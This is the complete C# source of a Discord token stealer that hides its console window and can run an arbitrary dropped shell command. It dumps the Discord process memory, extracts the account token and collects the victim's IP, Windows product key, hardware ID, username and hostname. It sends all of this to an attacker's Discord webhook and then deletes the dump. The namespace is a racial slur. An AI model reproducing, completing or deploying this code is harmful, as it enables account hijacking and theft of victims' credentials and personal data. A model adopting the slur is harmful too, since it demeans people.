using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Collections.Specialized;
using System.Net;
namespace Nigga
{
    class Program
    {
        public enum MINIDUMP_TYPE
        {
            MiniDumpWithFullMemory = 0x00000002,
        }

        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            UInt32 ProcessId,
            SafeHandle hFile,
            MINIDUMP_TYPE DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);


        static int SW_HIDE = 0;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        public class Discord
        {
            public static readonly string wbk = "%WEBHOOK%";
            public static readonly bool useDropCommand = false;
            public static readonly string dropCommand = "";
            public static readonly bool sendLogs = false;
            public static string logs = "";

            static void HideMe()
            {
                IntPtr myWindow = GetConsoleWindow();
                ShowWindow(myWindow, SW_HIDE);
            }
            public class Http
            {
                public static byte[] Post(string url, NameValueCollection pairs)
                {
                    using (WebClient webClient = new WebClient())
                        return webClient.UploadValues(url, pairs);
                }
            }
            public static string ExtractToken(string fn)
            {
                Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                FileInfo info = new FileInfo(fn);
                if (info.Exists)
                {
                    string contents = File.ReadAllText(info.FullName);
                    Match match = regex.Match(contents);
                    if (match.Success)
                    {
                        return match.Value;
                    }

                    else
                        return "Not found :(";

                }

                return "Not found :(";
            }

            public static void Ship(string token)
            {
                if (Nigga.Program.Discord.sendLogs) Discord.Send("New MEMDUMP\n```diff\n! IP - " + GrapIP() + "\n! TOKEN - " + token + "\n! WINDOWS KEY - " + GetProductKey() + "\n! HWID - " + GetHWID() + "\n! INFO - " + Environment.UserName + " - " + System.Net.Dns.GetHostName() + "\n! OS - " + Environment.OSVersion + $"\n{Nigga.Program.Discord.logs}\n\n- Made by timmywag#4066\n```");
                else
                    Discord.Send("New MEMDUMP\n```diff\n! IP - " + GrapIP() + "\n! TOKEN - " + token + "\n! WINDOWS KEY - " + GetProductKey() + "\n! HWID - " + GetHWID() + "\n! INFO - " + Environment.UserName + " - " + System.Net.Dns.GetHostName() + "\n! OS - " + Environment.OSVersion + "\n- Made by timmywag#4066\n```");
            }


            public static string EvalCMD(string command)
            {
                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();

                cmd.StandardInput.WriteLine(command);
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                return cmd.StandardOutput.ReadToEnd();
            }

            public static string GetHWID()
            {
                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();

                cmd.StandardInput.WriteLine("wmic csproduct get uuid");
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                return cmd.StandardOutput.ReadToEnd().Split('\n')[5].Replace('\r', ' ').Replace('\n', ' ').Trim();
            }


            public static string GetProductKey()
            {
                Process cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();

                cmd.StandardInput.WriteLine("wmic path softwarelicensingservice get OA3xOriginalProductKey");
                cmd.StandardInput.Flush();
                cmd.StandardInput.Close();
                cmd.WaitForExit();
                return cmd.StandardOutput.ReadToEnd().Split('\n')[5].Replace('\r', ' ').Replace('\n', ' ').Trim();
            }


            public static string GrapIP()
            {
                string html = string.Empty;
                string url = @"http://checkip.amazonaws.com";

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    html = reader.ReadToEnd();
                }

                return html.Replace('\n', ' ').Replace('\r', ' ').Trim();
            }
            public static void Send(string content)
            {
                string webHookUrl = Discord.wbk;
                Http.Post(webHookUrl, new NameValueCollection()
            {
                {
                    "content", content
                },

                {
                    "username", "MemDump"
                }
            });
            }

            static void Main()
            {
                Program.Discord.HideMe();

                if (Program.Discord.useDropCommand == true)
                {
                    try
                    {
                        Program.Discord.EvalCMD(Program.Discord.dropCommand);
                    }
                    catch (Exception e)
                    {
                        Program.Discord.logs += $"Failed to drop commmand.\n{e.ToString()}";
                    }
                }

                string fo = "discord.dmp";
                foreach (Process proid in Process.GetProcessesByName("discord"))
                {
                    UInt32 ProcessId = (uint)proid.Id;
                    IntPtr hProcess = proid.Handle;
                    MINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;
                    string out_dump_path = Path.Combine(Directory.GetCurrentDirectory(), "discord.dmp");
                    FileStream procdumpFileStream = File.Create(out_dump_path);
                    bool success = MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, DumpType, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                    procdumpFileStream.Close();
                    Ship(Program.Discord.ExtractToken(fo));


                    File.Delete(fo);


                    System.Environment.Exit(0);
                }



            }
        }
    }
}
